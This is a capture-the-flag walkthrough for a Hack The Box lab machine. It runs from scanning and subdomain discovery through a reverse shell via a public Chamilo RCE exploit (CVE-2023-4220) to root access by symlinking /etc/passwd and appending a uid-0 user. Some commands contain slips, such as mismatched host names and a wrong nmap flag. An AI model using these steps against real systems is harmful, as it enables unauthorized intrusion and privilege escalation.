# HTB Machine Walkthrough: XPerm

> [!IMPORTANT]  
> **Please use this as a hint or guide if you're blocked at some point of this machine, i make those files for myself and to help some friends that are also doing those machines.**


> [!NOTE]  
> **Try to get as far as you can by yourself or you will never learn to make machines alone. Hope you the best and happy hacking <3.**

## 1. Execute a Fast Nmap Scan on the Provided IP

  

To quickly identify open ports and services, use the following command:

  

```bash

nmap  -sC  -Sv  -n  -Pn  --min-rate  300  $IP  -vvv

```

  

### Result:

-  **22/tcp**: SSH

-  **80/tcp**: HTTP

  

## 2. Update /etc/hosts

  

Add the machine's IP to the `/etc/hosts` file and link it to `xperm.htb` for easier access.

  

## 3. FFUF the Page to Find Subdomains and Directories

  

Use FFUF to discover potential subdomains and directories:

  

```bash

ffuf  -u  http://xperm.htb/FUZZ  -w  /path/to/wordlist

```

  

### Result:

You will find some directories where you can't really do anything, but you will find a subdomain named **lms**.

  

## 4. FFUF the Subdomain

  

Run FFUF again, targeting the `lms` subdomain:

  

```bash

ffuf  -u  http://lms.xperm.htb/FUZZ  -w  /path/to/wordlist

```

  

### Result:

-  **/main**

-  **/documentation**

  

## 5. Search for Information on "Chamilo" in /documentation

  

Look for details about the Chamilo version in the `/documentation` section.

  

### Result:

The changelog reveals that the last version in use is **1.11.24**.

  

## 6. Search for an Exploit for the Exact Version

  

Look up any known vulnerabilities for Chamilo 1.11.24.

  

### Result:

An RCE exploit, CVE-2023-4220, is found.

  

## 7. Exploit the CVE

  

To exploit this CVE, use the repository available at [chamilo-lms-unauthenticated-big-upload-rce-poc](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc). This repository includes a Python script that exploits the vulnerability.

  

### Steps:

1.  **Clone the repo**:

```bash

git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc

```

  

2.  **Enter the repo directory**:

```bash

cd chamilo-lms-unauthenticated-big-upload-rce-poc

```

  

3.  **Set up a listener with netcat**:

```bash

nc -lnvp $any_port

```

  

4.  **Execute the main.py**:

```bash

python3 main.py -u http://lms.permx.htb -a revshell

```

-  **Note**: Follow the steps the program prompts.

  

### Result:

A shell is obtained. Next, escalate privileges from the `www-data` user.

  

## 8. Privilege Escalation

  

### 8.1. Upload and Execute linpeas.sh

  

Use `linpeas.sh` to enumerate the system and find useful information.

  

### Result:

You'll obtain a username and password.

  

### 8.2. Identify the User

  

Check the `/home` directory to find the username.

  

### 8.3. Connect via SSH

  

Attempt to connect using the obtained password:

  

```bash

ssh  user@xperm.htb

```

  

### Result:

You are now connected as the "user".

  

## 9. Retrieve the User Flag

  

The user flag is located in the `/home/user` directory as `user.txt`.

  

## 10. Privilege Escalation to Root

  

Check the sudo privileges:

  

```bash

sudo  -l

```

  

### Result:

You have access to `/opt/acl.sh`.

  

## 11. Inspect the Script

  

Review the `acl.sh` script to understand how it can be exploited.

  

### Result:

The script can be manipulated to grant permissions on any file.

  

## 12. Create a Symbolic Link

  

Create a symbolic link to `/etc/passwd` in your home directory:

  

```bash

ln  -s  /etc/passwd  passwd

```

  

## 13. Use the Script to Gain Write Access

  

Run the script to grant write access to the symbolic link:

  

```bash

/opt/acl.sh  user  rwx  /home/$user/passwd

```

  

## 14. Create a Password Hash

  

Generate a password hash using OpenSSL:

  

```bash

openssl  passwd  -1  "Zer0plusOne"

```

  

## 15. Add a New Root User

  

Append the new user details to the passwd file:

  

```bash

echo  'newuser:$1$randomsalt$hash:0:0:root:/root:/bin/bash' >> /home/$user/passwd

```

  

## 16. Switch to the Root User

  

Now you have root access. Retrieve the root flag located in `/root` as `root.txt`.

  

# MACHINE COMPLETED

